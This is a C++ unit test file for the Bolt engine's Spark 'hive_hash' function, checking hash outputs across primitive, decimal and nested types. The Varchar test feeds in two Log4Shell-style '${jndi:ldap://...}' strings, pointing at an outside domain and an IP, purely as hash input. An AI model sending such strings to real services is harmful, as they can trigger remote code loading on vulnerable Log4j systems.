/*
 * Copyright (c) ByteDance Ltd. and/or its affiliates
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "bolt/functions/sparksql/DecimalUtil.h"
#include "bolt/functions/sparksql/tests/SparkFunctionBaseTest.h"

#include <stdint.h>
#include <type/HugeInt.h>
using namespace bytedance::bolt::test;
namespace bytedance::bolt::functions::sparksql::test {
namespace {
class HiveHashTest : public SparkFunctionBaseTest {
 protected:
  template <typename T>
  int32_t HiveHash(std::optional<T> arg) {
    return evaluateOnce<int32_t>("hive_hash(c0)", arg).value();
  }

  int32_t parseDate(const std::string& dateStr) {
    return DATE()->toDays(dateStr);
  }

  template <typename T>
  int32_t DecimalHiveHash(std::optional<T> arg, int precision, int scale) {
    std::vector<std::optional<T>> args;
    std::vector<TypePtr> types;
    args.push_back(std::move(arg));
    types.push_back(DECIMAL(precision, scale));
    return evaluateOnce<int32_t, T>("hive_hash(c0)", args, types).value();
  }
};

template <typename T>
using NestedVector = std::vector<std::vector<T>>;

inline NestedVector<std::vector<std::pair<int32_t, std::optional<int32_t>>>>
mapInput() {
  using M = std::vector<std::pair<int32_t, std::optional<int32_t>>>;
  return NestedVector<M>{
      // Empty.
      {},
      // Sort on normalized keys.
      {M{{1, 11}, {3, 10}}, M{{2, 11}, {0, 10}}, M{{1, 11}, {1, 10}}},
      // Sort on values when keys are same.
      {M{{1, 11}, {3, 10}}, M{{1, 13}, {3, 12}}},
      // Null values in map.
      {M{{0, std::nullopt}}, M{{0, 10}}},
  };
}

inline NestedVector<variant> rowInput() {
  variant nullRow = variant(TypeKind::ROW);
  variant nullInt = variant(TypeKind::INTEGER);
  return NestedVector<variant>{
      // Empty.
      {},
      // All nulls.
      {nullRow, nullRow},
      // Null row.
      {variant::row({2, "red"}), nullRow, variant::row({1, "blue"})},
      // Null values in row.
      {variant::row({1, "green"}), variant::row({nullInt, "red"})},
  };
}

TEST_F(HiveHashTest, Varchar) {
  EXPECT_EQ(HiveHash<std::string>("apache spark"), 1142704523L);
  EXPECT_EQ(HiveHash<std::string>("Spark"), 80085693);
  // -613724358L from hive shell
  EXPECT_EQ(HiveHash<std::string>("!@#$%^&*()_+=-"), 1533759290L);
  EXPECT_EQ(HiveHash<std::string>(""), 0);
  EXPECT_EQ(HiveHash<std::string>("abcdefghijklmnopqrstuvwxyz"), 958031277);
  // -648013852L from hive shell
  EXPECT_EQ(
      HiveHash<std::string>("AbCdEfGhIjKlMnOpQrStUvWxYz012"), 1499469796L);
  EXPECT_EQ(
      HiveHash<std::string>("12345678djdejidecjjeijcneknceincne"), 882028004);
  EXPECT_EQ(HiveHash<std::string>(std::nullopt), 0);
  EXPECT_EQ(
      HiveHash<std::string>(
          "-�你好%f0%9f%98%84%!a😄😄${jndi:ldap://f4e938bd3d000y05yzoxirxbif.reverse.nsfocus.com:1590/f4e938bd3d000y05yzoxirxbif}"),
      445083637);
  EXPECT_EQ(
      HiveHash<std::string>(
          "-�你好%f0%9f%98%84%!a😄😄${jndi:ldap://211.157.134.218:1056/f4e938bd3d000y05yzblplaubu}"),
      848899850);
  EXPECT_EQ(HiveHash<std::string>("73�2522474569319970"), 1895986962);
}

TEST_F(HiveHashTest, Int64) {
  EXPECT_EQ(HiveHash<int64_t>(0xcafecafedeadbeef), 341013521);
  EXPECT_EQ(HiveHash<int64_t>(0xdeadbeefcafecafe), 341013521);
  EXPECT_EQ(HiveHash<int64_t>(-2023), 2022);
  // -2147483648 from hive shell
  EXPECT_EQ(HiveHash<int64_t>(INT64_MAX), 0);
  // -2147483648 from hive shell
  EXPECT_EQ(HiveHash<int64_t>(INT64_MIN), 0);
  EXPECT_EQ(HiveHash<int64_t>(1), 1);
  EXPECT_EQ(HiveHash<int64_t>(0), 0);
  EXPECT_EQ(HiveHash<int64_t>(-1), 0);
  EXPECT_EQ(HiveHash<int64_t>(std::nullopt), 0);
}

TEST_F(HiveHashTest, unsignedBigintFlatVector) {
  auto input = makeNullableFlatVector<uint64_t>(
      {11,
       std::nullopt,
       std::numeric_limits<uint64_t>::max(),
       std::numeric_limits<uint64_t>::max() - 2022},
      BIGINT());
  auto result =
      evaluate<SimpleVector<int32_t>>("hive_hash(c0)", makeRowVector({input}));

  assertEqualVectors(makeFlatVector<int32_t>({11, 0, 0, 2022}), result);
}

TEST_F(HiveHashTest, bigintDictionaryUsesDecodedPath) {
  auto flat = makeFlatVector<int64_t>({11, 12});
  auto dictionary = wrapInDictionary(makeIndices({1, 0}), flat);
  auto result = evaluate<SimpleVector<int32_t>>(
      "hive_hash(c0)", makeRowVector({dictionary}));

  assertEqualVectors(makeFlatVector<int32_t>({12, 11}), result);
}

TEST_F(HiveHashTest, Int32) {
  EXPECT_EQ(HiveHash<int32_t>(INT32_MAX), INT32_MAX);
  // INT32_MIN from hive shell
  EXPECT_EQ(HiveHash<int32_t>(INT32_MIN), 0);
  EXPECT_EQ(HiveHash<int32_t>(0x3afecafe), 989776638);
  EXPECT_EQ(HiveHash<int32_t>(1), 1);
  EXPECT_EQ(HiveHash<int32_t>(0), 0);
  // -1 from hive shell
  EXPECT_EQ(HiveHash<int32_t>(-1), INT32_MAX);
  // -2023 from hive shell
  EXPECT_EQ(HiveHash<int32_t>(-2023), 2147481625);
  EXPECT_EQ(HiveHash<int32_t>(std::nullopt), 0);
}

TEST_F(HiveHashTest, Int16) {
  EXPECT_EQ(HiveHash<int16_t>(INT16_MAX), INT16_MAX);
  // INT16_MIN from hive shell
  EXPECT_EQ(HiveHash<int16_t>(INT16_MIN), 2147450880);
  EXPECT_EQ(HiveHash<int16_t>(-2023), 2147481625);
  EXPECT_EQ(HiveHash<int16_t>(1), 1);
  EXPECT_EQ(HiveHash<int16_t>(0), 0);
  EXPECT_EQ(HiveHash<int16_t>(-1), 2147483647);
  EXPECT_EQ(HiveHash<int16_t>(std::nullopt), 0);
}

TEST_F(HiveHashTest, Int8) {
  EXPECT_EQ(HiveHash<int8_t>(INT8_MAX), INT8_MAX);
  EXPECT_EQ(HiveHash<int8_t>(INT8_MIN), 2147483520);
  EXPECT_EQ(HiveHash<int8_t>(1), 1);
  EXPECT_EQ(HiveHash<int8_t>(0), 0);
  EXPECT_EQ(HiveHash<int8_t>(-1), 2147483647);
  EXPECT_EQ(HiveHash<int8_t>(std::nullopt), 0);
}

TEST_F(HiveHashTest, Boolean) {
  EXPECT_EQ(HiveHash<bool>(false), 0);
  EXPECT_EQ(HiveHash<bool>(true), 1);
  EXPECT_EQ(HiveHash<bool>(std::nullopt), 0);
}

TEST_F(HiveHashTest, varcharInt64) {
  auto HiveHash = [&](std::optional<std::string> a, std::optional<int64_t> b) {
    return evaluateOnce<int32_t>("hive_hash(c0, c1)", a, b);
  };

  EXPECT_EQ(HiveHash("Spark", 2023), 335174858);
  EXPECT_EQ(HiveHash("Spark", -2023), 335174857);
  EXPECT_EQ(HiveHash("!@#$%^&*()_+=-", 2023), 301899757);
  EXPECT_EQ(HiveHash("!@#$%^&*()_+=-", -2023), 301899756);
  EXPECT_EQ(HiveHash(std::nullopt, std::nullopt), 0);
  EXPECT_EQ(HiveHash("", std::nullopt), 0);
  EXPECT_EQ(HiveHash(std::nullopt, 0), 0);
  EXPECT_EQ(HiveHash("", 0), 0);
}

TEST_F(HiveHashTest, Double) {
  using limits = std::numeric_limits<double>;

  EXPECT_EQ(HiveHash<double>(std::nullopt), 0);
  EXPECT_EQ(HiveHash<double>(-0.0), 0);
  EXPECT_EQ(HiveHash<double>(0), 0);
  // -1503133693 from hive shell
  EXPECT_EQ(HiveHash<double>(1.1), 644349955);
  EXPECT_EQ(HiveHash<double>(-1.1), 644349955);
  EXPECT_EQ(HiveHash<double>(1000000000.000001), 1104006509);
  EXPECT_EQ(HiveHash<double>(limits::quiet_NaN()), 2146959360);
  EXPECT_EQ(HiveHash<double>(limits::max()), 1048576);
  EXPECT_EQ(HiveHash<double>(limits::lowest()), 1048576);
}

TEST_F(HiveHashTest, Float) {
  using limits = std::numeric_limits<float>;

  EXPECT_EQ(HiveHash<float>(std::nullopt), 0);
  EXPECT_EQ(HiveHash<float>(-0.0f), 0);
  EXPECT_EQ(HiveHash<float>(0), 0);
  EXPECT_EQ(HiveHash<float>(1.1), 1066192077L);
  // -1081291571 from hive shell
  EXPECT_EQ(HiveHash<float>(-1.1), 1066192077L);
  EXPECT_EQ(HiveHash<float>(99999999.99999999999), 1287568416L);
  EXPECT_EQ(HiveHash<float>(1000000000.000001), 1315859240);

  EXPECT_EQ(HiveHash<float>(limits::quiet_NaN()), 2143289344);
  EXPECT_EQ(HiveHash<float>(limits::max()), 2139095039);
  EXPECT_EQ(HiveHash<float>(limits::lowest()), 2139095039);
}

TEST_F(HiveHashTest, Date) {
  EXPECT_EQ(HiveHash<int32_t>(parseDate("2017-01-01")), 17167);
  // -719528 from hive shell
  EXPECT_EQ(HiveHash<int32_t>(parseDate("0000-01-01")), 2146764120);
  EXPECT_EQ(HiveHash<int32_t>(parseDate("9999-12-31")), 2932896);
  EXPECT_EQ(HiveHash<int32_t>(parseDate("1970-01-01")), 0);
  // -62091
  EXPECT_EQ(HiveHash<int32_t>(parseDate("1800-01-01")), 2147421557);
  EXPECT_EQ(HiveHash<int32_t>(parseDate("1213-01-01")), 2147207160);
  EXPECT_EQ(HiveHash<int32_t>(std::nullopt), 0);
}

TEST_F(HiveHashTest, Timestamp) {
  const auto unixTimestamp = [&](std::optional<StringView> dateStr) {
    return evaluateOnce<int64_t>("unix_timestamp(c0)", dateStr);
  };

  // 2017-02-24 10:56:29 UTC
  EXPECT_EQ(HiveHash<Timestamp>(Timestamp(1487933789, 0)), 1445725271);
  EXPECT_EQ(HiveHash<Timestamp>(Timestamp(1487933789, 111111000)), 1353936655);
}

TEST_F(HiveHashTest, ShortDecimal) {
  EXPECT_EQ(DecimalHiveHash<int64_t>(18, 18, 0), 558);
  EXPECT_EQ(DecimalHiveHash<int64_t>(18, 18, 0), 558);
  EXPECT_EQ(DecimalHiveHash<int64_t>(-18, 18, 0), 2147483090);
  EXPECT_EQ(DecimalHiveHash<int64_t>(0, 18, 2), 0);
  EXPECT_EQ(DecimalHiveHash<int64_t>(1800, 18, 2), 558);
  EXPECT_EQ(DecimalHiveHash<int64_t>(-1800, 18, 2), 2147483090);
  EXPECT_EQ(DecimalHiveHash<int64_t>(999999999999999999, 18, 0), 1571411412);
  EXPECT_EQ(DecimalHiveHash<int64_t>(999999999999999999, 18, 2), 1571411414);
  EXPECT_EQ(DecimalHiveHash<int64_t>(-999999999999999999, 18, 0), 576072236);
  EXPECT_EQ(DecimalHiveHash<int64_t>(-999999999999999999, 18, 2), 576072238);
}

TEST_F(HiveHashTest, LongDecimal) {
  EXPECT_EQ(DecimalHiveHash<int128_t>(18L, 38, 0), 558);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-18L, 38, 0), 2147483090);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-18L, 38, 12), 2147483102);

  int128_t decimals = 10'000'000'000;
  int128_t value = 18446744073709001 * (int128_t)1'000;
  EXPECT_EQ(DecimalHiveHash<int128_t>(value, 38, 19), 588393182);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-value, 38, 19), 1559090498);
  EXPECT_EQ(DecimalHiveHash<int128_t>(value, 38, 3), 588393166);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-value, 38, 3), 1559090482);

  EXPECT_EQ(DecimalHiveHash<int128_t>(9223372036854775807L, 38, 4), 2147482660);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-9223372036854775807L, 38, 4), 996);

  EXPECT_EQ(DecimalHiveHash<int128_t>(00000.00000000000L, 38, 34), 0);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-00000.00000000000L, 38, 11), 0);

  EXPECT_EQ(DecimalHiveHash<int128_t>(1234561234567890L, 38, 0), 1535136129);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-1234561234567890L, 38, 0), 612347519);
  EXPECT_EQ(DecimalHiveHash<int128_t>(1234561234567890L, 38, 2), 1871500244);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-1234561234567890L, 38, 2), 275983406);

  EXPECT_EQ(DecimalHiveHash<int128_t>(1234561234567890L, 38, 10), 1871500252);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-1234561234567890L, 38, 10), 275983414);
  EXPECT_EQ(DecimalHiveHash<int128_t>(1234561234567890L, 38, 20), 1871500262);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-1234561234567890L, 38, 20), 275983424);

  value = (int128_t)1234561234567890 * decimals * decimals +
      (int128_t)1234567890 * decimals + (int128_t)1234567890;
  EXPECT_EQ(DecimalHiveHash<int128_t>(value, 38, 0), 107227799);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-value, 38, 0), 2040255849);
  EXPECT_EQ(DecimalHiveHash<int128_t>(value, 38, 10), 1728235646);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-value, 38, 10), 419248020);

  EXPECT_EQ(DecimalHiveHash<int128_t>(value, 38, 20), 1728235656);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-value, 38, 20), 419248030);
  EXPECT_EQ(DecimalHiveHash<int128_t>(value, 38, 30), 1728235666);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-value, 38, 30), 419248040);
  EXPECT_EQ(DecimalHiveHash<int128_t>(value, 38, 31), 1728235667);
  EXPECT_EQ(DecimalHiveHash<int128_t>(-value, 38, 31), 419248041);
}

TEST_F(HiveHashTest, Array) {
  auto arg = makeNullableArrayVector<int>({{0, 1}});
  EXPECT_EQ(
      evaluateOnce<int32_t>("hive_hash(c0)", makeRowVector({arg})).value(), 1);

  auto testArrayHash =
      [&](const VectorPtr& arrayVector,
          const std::vector<std::optional<int32_t>>& expected) {
        auto result = evaluate<SimpleVector<int32_t>>(
            "hive_hash(c0)", makeRowVector({arrayVector}));

        assertEqualVectors(makeNullableFlatVector<int32_t>(expected), result);
      };

  auto arrayOfMap = makeArrayOfMapVector(mapInput());
  testArrayHash(arrayOfMap, {0, 18869, 616, 10});

  // last 98619170, 909823407
  auto rowType = ROW({INTEGER(), VARCHAR()});
  auto arrayOfRow = makeArrayOfRowVector(rowType, rowInput());
  testArrayHash(arrayOfRow, {0, 0, 111473032, 909823407});

  using array_type = std::optional<std::vector<std::optional<int64_t>>>;
  array_type array1 = {{1, 2}};
  array_type array2 = emptyArray;
  array_type array3 = {{1, 100, 2}};

  // 33, 1023, 35776
  auto nestedArray =
      makeNullableNestedArrayVector<int64_t>({{{array1, array2, array3}}});
  testArrayHash(nestedArray, {35776});

  auto unknownArray = makeArrayWithDictionaryElements<UnknownValue>(
      {std::nullopt, std::nullopt, std::nullopt, std::nullopt},
      2,
      ARRAY(UNKNOWN()));
  testArrayHash(unknownArray, {0, 0});
}

TEST_F(HiveHashTest, Map) {
  auto testMapHash = [&](const VectorPtr& mapVector,
                         const std::vector<std::optional<int32_t>>& expected) {
    auto result = evaluate<SimpleVector<int32_t>>(
        "hive_hash(c0)", makeRowVector({mapVector}));

    assertEqualVectors(makeNullableFlatVector<int32_t>(expected), result);
  };
  auto arg =
      makeMapVector<int32_t, int32_t>({{{1, 1}}}, MAP(INTEGER(), INTEGER()));
  testMapHash(arg, {0});

  auto mapOfArray = createMapOfArraysVector<int64_t, int64_t>(
      {{{1, {{2}}}}, {{3, {{4, 5, 6}}}}, {{7, {{8, 9, 10}}}}});
  testMapHash(mapOfArray, {3, 4006, 7982});

  auto mapOfMap = createMapOfMapVector<int64_t, int64_t, int64_t>(
      {{{1, {{{2, 3}, {4, 5}}}}}, {{6, {{{7, 8}}}}}});
  testMapHash(mapOfMap, {3, 9});

  auto mapOfRow = createMapOfRowVector<int64_t, int64_t, int64_t>(
      {{{1, {{2, 3}}}, {3, {{4, 5}}}}, {{6, {{7, 8}}}}});
  testMapHash(mapOfRow, {194, 231});

  auto keys = makeFlatUnknownVector(6);
  auto values = makeFlatUnknownVector(6);
  auto mapOfUnkoen = makeMapVector({0, 1, 3}, keys, values);
  testMapHash(mapOfUnkoen, {0, 0, 0});
}

TEST_F(HiveHashTest, Row) {
  auto row = makeRowVector({
      makeNullableFlatVector<int64_t>({11, 12}),
      makeNullableFlatVector<int64_t>({1, 2}),
  });
  auto result =
      evaluate<SimpleVector<int32_t>>("hive_hash(c0)", makeRowVector({row}));
  assertEqualVectors(makeNullableFlatVector<int32_t>({342, 374}), result);

  auto testRowHash = [&](const VectorPtr& rowVector,
                         const std::vector<std::optional<int32_t>>& expected) {
    auto result = evaluate<SimpleVector<int32_t>>(
        "hive_hash(c0)", makeRowVector({rowVector}));

    assertEqualVectors(makeNullableFlatVector<int32_t>(expected), result);
  };

  auto boolRow = makeRowVector(
      {makeNullableFlatVector<int32_t>({11, 12}),
       makeNullableFlatVector<bool>({true, false})});
  testRowHash(boolRow, {342, 372});

  auto rowNested = makeRowVector(
      {makeMapVector<int32_t, int32_t>(
           {
               {{1, 10}, {2, 20}},
               {{3, 30}, {4, 40}},
           },
           MAP(INTEGER(), INTEGER())),
       makeNullableArrayVector<int32_t>({{0, 1}, {2, 3}}),
       makeRowVector({
           makeNullableFlatVector<int64_t>({11, 12}),
           makeNullableFlatVector<int64_t>({1, 2}),
       })});
  testRowHash(rowNested, {32086, 72542});

  auto rowOfUnknownChildren = makeRowVector({
      makeFlatUnknownVector(2),
      makeFlatUnknownVector(2),
  });
  testRowHash(rowOfUnknownChildren, {0, 0});

  rowOfUnknownChildren = makeRowVector(
      {makeMapVector<int32_t, int32_t>(
           {
               {{1, 10}, {2, 20}},
               {{3, 30}, {4, 40}},
           },
           MAP(INTEGER(), INTEGER())),
       makeArrayWithDictionaryElements<UnknownValue>(
           {std::nullopt, std::nullopt, std::nullopt, std::nullopt},
           2,
           ARRAY(UNKNOWN())),
       makeNullableArrayVector<int32_t>({{0, 1}, {2, 3}}),
       makeFlatUnknownVector(2),
       makeRowVector({
           makeNullableFlatVector<int64_t>({11, 12}),
           makeNullableFlatVector<int64_t>({1, 2}),
       })});
  testRowHash(rowOfUnknownChildren, {30477496, 67479872});
}

TEST_F(HiveHashTest, Null) {
  auto row = makeRowVector({
      makeNullableFlatVector<int64_t>({std::nullopt, std::nullopt}),
      makeNullableFlatVector<int64_t>({1, 2}),
  });
  auto testRowHash = [&](const RowVectorPtr& rowVector,
                         const std::vector<std::optional<int32_t>>& expected) {
    auto result =
        evaluate<SimpleVector<int32_t>>("hive_hash(c1, c0)", rowVector);

    assertEqualVectors(makeNullableFlatVector<int32_t>(expected), result);
  };

  std::vector<std::optional<int32_t>> expected{31, 62};
  testRowHash(row, expected);
}

TEST_F(HiveHashTest, Complex) {
  auto testHash = [&](const VectorPtr& vector,
                      const std::vector<std::optional<int32_t>>& expected) {
    auto result = evaluate<SimpleVector<int32_t>>(
        "hive_hash(c0)", makeRowVector({vector}));

    assertEqualVectors(makeNullableFlatVector<int32_t>(expected), result);
  };

  // row(map, array, row)
  auto rowNested = makeRowVector(
      {makeMapVector<int32_t, int32_t>(
           {
               {{1, 10}, {2, 20}},
               {{3, 30}, {4, 40}, {9, 90}},
               {{5, std::nullopt}, {6, 60}},
               {{7, std::nullopt}},
           },
           MAP(INTEGER(), INTEGER())),
       makeNullableArrayVector<int32_t>(
           {{0, 1},
            {2, 3, 4},
            {6, std::nullopt, 7},
            {std::nullopt, std::nullopt}}),
       makeRowVector({
           makeNullableFlatVector<int64_t>({11, 12, std::nullopt, 13}),
           makeNullableFlatVector<int64_t>({1, 2, 4, 5}),
       })});

  // map(array)
  auto mapOfArray = createMapOfArraysVector<int64_t, int64_t>(
      {{{3, {{4, 5, 6, 1, 2}}}},
       {{5, {{4, std::nullopt, 1, 2}}}},
       {{std::nullopt, {{4, 5, 6, 1, 2}}}},
       {{7, std::nullopt}}});
  // map(map)
  auto mapOfMap = createMapOfMapVector<int64_t, int64_t, int64_t>(
      {{{1, {{{2, 3}, {4, 5}}}}},
       {{std::nullopt, {{{2, 3}, {4, 5}}}}},
       {{1, {{{2, 3}, {4, std::nullopt}}}}},
       {{6, std::nullopt}}});
  // map(row)
  auto mapOfRow = createMapOfRowVector<int64_t, int64_t, int64_t>(
      {{{1, {{2, 3}}}, {3, {{4, 5}}}},
       {{std::nullopt, {{2, 3}}}, {3, std::nullopt}},
       {{1, {{2, std::nullopt}}}, {3, {{std::nullopt, 5}}}},
       {{6, {{7, 8}}}}});

  // array(map)
  auto arrayOfMap = makeArrayOfMapVector(mapInput());
  // array(row)
  auto rowType = ROW({INTEGER(), VARCHAR()});
  auto arrayOfRow = makeArrayOfRowVector(rowType, rowInput());
  // array(array)
  using array_type = std::optional<std::vector<std::optional<int64_t>>>;
  array_type array1 = std::nullopt;
  array_type array2 = {{1, 100, 2}};
  array_type array3 = {{1, 100, std::nullopt}};
  array_type array4 = {{315}};

  auto nestedArray = makeNullableNestedArrayVector<int64_t>(
      {{{array1, array2}}, {{array2, array4}}, {{array3}}, {{array4}}});

  // started with row
  // row(row(map, array, row), array(row), array(map), array(array), map(array),
  // map(row), map(map))
  auto finalRowVector = makeRowVector(
      {nestedArray,
       arrayOfMap,
       arrayOfRow,
       mapOfArray,
       mapOfMap,
       mapOfRow,
       rowNested});
  testHash(finalRowVector, {1146521617, 1616741980, 1442304236, 67975767});
}

TEST_F(HiveHashTest, MultiCols) {
  auto testHash = [&](const std::vector<VectorPtr>& vectors,
                      const std::vector<int32_t>& expected) {
    std::string funcCall = "hive_hash(";
    for (int i = 0; i < vectors.size(); i++) {
      funcCall.push_back('c');
      funcCall.push_back('0' + i);
      funcCall.append(", ");
    }
    funcCall.pop_back();
    funcCall.back() = ')';
    auto result =
        evaluate<SimpleVector<int32_t>>(funcCall, makeRowVector(vectors));

    assertEqualVectors(makeFlatVector<int32_t>(expected), result);
  };

  auto arrayVec = makeNullableArrayVector<int>({{0, 1}, {3, 2}});
  auto mapVec = makeMapVector<int32_t, int32_t>(
      {{{1, 2}, {3, 4}}, {{13, 14}}}, MAP(INTEGER(), INTEGER()));
  auto rowVec = makeRowVector({
      makeNullableFlatVector<int64_t>({11, 12}),
      makeNullableFlatVector<int64_t>({1, 2}),
  });
  auto flatVec = makeFlatVector<int32_t>({3, 9});
  std::vector<VectorPtr> vecs{rowVec, arrayVec, mapVec, flatVec};
  std::vector<std::vector<int>> indexes{
      {3, 0}, {3, 1}, {3, 2}, {1, 2, 0}, {0, 3, 1}, {2, 3}, {1, 3, 2}};
  std::vector<std::vector<int32_t>> results{
      {435, 653},
      {94, 374},
      {103, 282},
      {1613, 91762},
      {328756, 359788},
      {313, 102},
      {1064, 91577}};
  for (int i = 0; i < indexes.size(); i++) {
    const auto& index = indexes[i];
    std::vector<VectorPtr> data;
    for (int idx : index) {
      data.emplace_back(vecs[idx]);
    }
    testHash(data, results[i]);
  }
}

TEST_F(HiveHashTest, MultiPrimitiveCols) {
  auto testHash = [&](const std::vector<VectorPtr>& vectors,
                      const std::vector<int32_t>& expected) {
    std::string funcCall = "hive_hash(";
    for (int i = 0; i < vectors.size(); i++) {
      funcCall.push_back('c');
      funcCall.append(std::to_string(i));
      funcCall.append(", ");
    }
    funcCall.pop_back();
    funcCall.back() = ')';
    auto result =
        evaluate<SimpleVector<int32_t>>(funcCall, makeRowVector(vectors));

    assertEqualVectors(makeFlatVector<int32_t>(expected), result);
  };

  auto vid = makeFlatVector<StringView>({"2124576", "2124576"});
  auto pricing_type = makeFlatVector<int64_t>({9, 9});
  auto rit = makeFlatVector<int64_t>({1, 1});
  auto content_type = makeFlatVector<int64_t>({1, 1});
  auto image_mode = makeFlatVector<int64_t>({15, 15});
  auto rt = makeFlatVector<int64_t>({1, 1});
  auto external_action = makeFlatVector<StringView>({"shopping", "shopping"});
  auto system_origin = makeFlatVector<StringView>({"12", "12"});
  auto deep_external_action =
      makeNullableFlatVector<StringView>({std::nullopt, std::nullopt});
  auto deep_bid_type = makeFlatVector<StringView>({"1", "1"});
  auto classify = makeFlatVector<int64_t>({1L, 1L});
  auto landing_type =
      makeNullableFlatVector<int64_t>({std::nullopt, std::nullopt});
  auto abtest_bingo = makeFlatVector<StringView>({"0", "0"});
  auto orit = makeFlatVector<int64_t>({33013L, 33013L});
  auto predict_identity = makeFlatVector<StringView>({"feed", "feed"});
  auto app_code = makeFlatVector<int64_t>({8L, 8L});
  auto external_action_id =
      makeNullableFlatVector<int64_t>({std::nullopt, std::nullopt});
  std::vector<int32_t> result{147423648, 147423648};
  std::vector<VectorPtr> vecs{
      vid,
      pricing_type,
      rit,
      content_type,
      image_mode,
      rt,
      external_action,
      system_origin,
      deep_external_action,
      deep_bid_type,
      classify,
      landing_type,
      abtest_bingo,
      orit,
      predict_identity,
      app_code,
      external_action_id};
  testHash(vecs, result);
}

TEST_F(HiveHashTest, MultiColsWithDecimal) {
  auto testHash = [&](const std::vector<VectorPtr>& vectors,
                      const std::vector<int32_t>& expected) {
    std::string funcCall = "hive_hash(";
    for (int i = 0; i < vectors.size(); i++) {
      funcCall.push_back('c');
      funcCall.append(std::to_string(i));
      funcCall.append(", ");
    }
    funcCall.pop_back();
    funcCall.back() = ')';
    auto result =
        evaluate<SimpleVector<int32_t>>(funcCall, makeRowVector(vectors));

    assertEqualVectors(makeFlatVector<int32_t>(expected), result);
  };
  auto intVec = makeFlatVector<int32_t>({1, 2});
  auto decimalVec = makeFlatVector<int64_t>({0, 100000}, DECIMAL(18, 5));
  auto doubleVec = makeFlatVector<double>({0.25, 0.125});

  std::vector<std::vector<int32_t>> result{
      {1070597057, 1069550403}, {976225217, 943720353}};

  std::vector<VectorPtr> midDecimal{intVec, decimalVec, doubleVec};
  std::vector<VectorPtr> lastDecimal{intVec, doubleVec, decimalVec};
  testHash(midDecimal, result[0]);
  testHash(lastDecimal, result[1]);
}

void testLongDecimalDiv(int128_t v) {
  ASSERT_EQ(v % 10 == 0, DecimalUtil::isDivisiable10(v));
  while (v != 0) {
    ASSERT_EQ(v % 10 == 0, DecimalUtil::isDivisiable10(v));
    ASSERT_EQ(v / 10, DecimalUtil::div10(v));
    v = v / 10;
  }
}

TEST_F(HiveHashTest, longDecimalDiv) {
  testLongDecimalDiv(0);
  testLongDecimalDiv(1);
  testLongDecimalDiv(-1);
  testLongDecimalDiv(2);
  testLongDecimalDiv(-2);
  testLongDecimalDiv(10);
  testLongDecimalDiv(-10);
  testLongDecimalDiv(10000000);
  testLongDecimalDiv(-10000000);
  testLongDecimalDiv(0xdeadbeaf);
  testLongDecimalDiv(-0xdeadbeaf);
  int128_t v = 0xdeadbeafULL;
  v = (v << 64) + v;
  testLongDecimalDiv(v);
  testLongDecimalDiv(-v);
}

} // namespace
} // namespace bytedance::bolt::functions::sparksql::test
